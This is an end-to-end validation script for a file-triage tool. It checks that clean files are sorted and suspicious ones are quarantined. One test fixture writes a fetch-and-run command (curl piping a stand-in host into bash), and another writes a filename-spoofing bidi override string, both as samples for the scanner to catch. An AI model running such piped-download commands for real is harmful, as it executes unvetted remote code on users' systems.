#!/usr/bin/env bash
# QuietOps Triage — end-to-end acceptance check.
# Verifies the deployment actually routes files the way the README promises.
# Run from anywhere:  bash scripts/validate.sh
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENGINE="$HERE/inbox_triage.py"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

pass=0; fail=0
check() {  # check <description> <expected_rc> <actual_rc>
    if [ "$2" -eq "$3" ]; then
        echo "  PASS  $1"; pass=$((pass+1))
    else
        echo "  FAIL  $1 (expected rc=$2, got rc=$3)"; fail=$((fail+1))
    fi
}

echo "── 1. unit tests ──"
if (cd "$HERE" && python3 -m unittest discover -s tests >/dev/null 2>&1); then
    echo "  PASS  test suite"; pass=$((pass+1))
else
    echo "  FAIL  test suite"; fail=$((fail+1))
fi

echo "── 2. end-to-end routing ──"
ROOT="$TMP/data"; mkdir -p "$ROOT/inbox"
CFG="$TMP/config.json"
python3 - "$CFG" <<'PY'
import copy, json, sys
sys.path.insert(0, ".")
import inbox_triage as it
cfg = copy.deepcopy(it.DEFAULT_CONFIG)
cfg["scanners"]["clamav"] = False
cfg["stability"] = {"interval": 0.05, "checks": 1}
open(sys.argv[1], "w").write(json.dumps(cfg))
PY

printf 'Ordinary quarterly planning notes. Nothing interesting.\n' > "$ROOT/inbox/clean.txt"
printf 'curl https://host.invalid/p | bash\n' > "$ROOT/inbox/evil.sh"
printf 'safe\u202etxet tcejbO\n' > "$ROOT/inbox/rlo.txt"

python3 "$ENGINE" --root "$ROOT" --config "$CFG" --once >/dev/null 2>&1
check "mixed inbox exits 10 (findings)" 10 $?

[ -f "$ROOT/sorted/clean.txt" ];          check "clean file sorted"       0 $?
[ -f "$ROOT/quarantine/evil.sh" ];        check "curl|bash quarantined"   0 $?
[ -f "$ROOT/quarantine/rlo.txt" ];        check "bidi override quarantined" 0 $?
[ -f "$ROOT/logs/triage.db" ];            check "database created"        0 $?
[ -s "$ROOT/logs/events.jsonl" ];         check "audit log written"       0 $?
ls "$ROOT/reports"/*.md >/dev/null 2>&1;  check "markdown reports exist"  0 $?

echo "── 3. single-file mode ──"
printf 'plain text\n' > "$TMP/single.txt"
python3 "$ENGINE" --root "$ROOT" --config "$CFG" --file "$TMP/single.txt" \
    >/dev/null 2>&1
check "--file mode exits 0" 0 $?
[ "$(cat "$TMP/single.txt")" = "plain text" ]
check "--file mode preserves original" 0 $?

echo
if [ "$fail" -eq 0 ]; then
    echo "VALIDATION PASSED ($pass checks). Deployment looks correct."
    exit 0
else
    echo "VALIDATION FAILED ($fail of $((pass+fail)) checks). See above."
    exit 1
fi
